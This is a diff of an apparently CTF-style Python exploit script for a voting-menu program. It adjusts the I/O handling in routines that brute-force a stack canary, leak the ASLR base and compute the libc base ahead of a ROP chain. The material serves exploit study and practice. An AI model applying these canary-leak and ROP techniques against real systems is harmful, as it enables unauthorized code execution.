@@ -52,15 +52,13 @@ def hack_vote_ret(canary, base):
 
     # quit voting --> GET libc base
     pause()
-    r.sendline('3')
+    r.sendlineafter('>', '3')
+    # recv the menu, and eat it out
+    r.recv()
     recv_str = r.recv().split()
-
-    # print(recv_str)
-    # print(len(recv_str[-1]))
 
     libc_base = u64(recv_str[-1] + '\0\0') - 0x201ab0
     print('libc_base --> ', hex(libc_base))
-    pause()
 
     return libc_base
 
@@ -118,7 +116,6 @@ def hack_canary_ASLR():
             guess += 1
 
     print('ASLR base --> ', hex(u64(aslr) - 0x1140))
-    pause()
     return u64(canary), u64(aslr) - 0x1140
 
 # craft the rop for libc base
